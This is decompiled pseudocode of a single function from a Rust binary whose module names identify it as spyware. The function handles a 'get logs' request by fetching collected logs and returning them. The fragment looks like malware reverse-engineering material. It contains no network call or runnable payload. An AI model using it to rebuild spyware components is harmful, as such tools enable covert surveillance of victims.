
  fn spyware::actions::log_actions::get_logs_request::h84eb7739ff3a4934(arg1: *mut i128) -> *mut i128

{
    let mut var_78: *const i8;
    let mut var_50: *mut *mut c_void;
    let mut var_40: i64;
    
    if core::sync::atomic::atomic_load::h8c88032dab18ab12(
        &log::MAX_LOG_LEVEL_FILTER::h115edbfc95f53bc0, 0) >= 4
    {
        var_50 = &data_4b99d8;
        let var_48_1: i64 = 1;
        var_40 = 8;
        let var_38_1: i128 = {0};
        let rax_1: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b99f8);
        var_78 = "spyware::actions::log_actionsspy…";
        let var_70_1: i64 = 0x1d;
        let var_68_1: *const i8 = "spyware::actions::log_actionsspy…";
        let var_60_1: i64 = 0x1d;
        let var_58_1: i64 = rax_1;
        log::__private_api::log::h13afddf373bd7d7f(&var_50, 4, &var_78);
    }
    
    let mut var_20: i64;
    spyware::logging::core::get_logs::h979297f7bb1c44d2(&var_20);
    
    if !(0 + -(var_20))
    {
        let var_10: i64;
        arg1[1] = var_10;
        *arg1 = var_20;
        *arg1.byte_offset(0x18) = -0x8000000000000000;
        return arg1;
    }
    
    if core::sync::atomic::atomic_load::h8c88032dab18ab12(
        &log::MAX_LOG_LEVEL_FILTER::h115edbfc95f53bc0, 0) != 0
    {
        var_50 = &data_4b99e8;
        let var_48_2: i64 = 1;
        var_40 = 8;
        let var_38_2: i128 = {0};
        let rax_3: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b9a10);
        var_78 = "spyware::actions::log_actionsspy…";
        let var_70_2: i64 = 0x1d;
        let var_68_2: *const i8 = "spyware::actions::log_actionsspy…";
        let var_60_2: i64 = 0x1d;
        let var_58_2: i64 = rax_3;
        log::__private_api::log::h13afddf373bd7d7f(&var_50, 1, &var_78);
    }
    
    var_78 = nullptr;
    let var_70_3: i64 = 8;
    let var_68_3: i64 = 0;
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4bd00d1297ead281(&var_50);
    *arg1.byte_offset(0x28) = var_40;
    *arg1.byte_offset(0x18) = var_50;
    arg1[1] = var_68_3;
    *arg1 = var_78;
    arg1[3] = 1;
    arg1
}
